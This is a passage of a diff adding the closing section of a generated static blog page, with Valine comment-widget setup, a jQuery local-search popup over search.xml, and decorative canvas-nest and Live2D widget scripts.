+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      }
+      
+        loadComments();
+      
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
+        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: true
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"live2d-widget-model-hijiki"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
+</html>
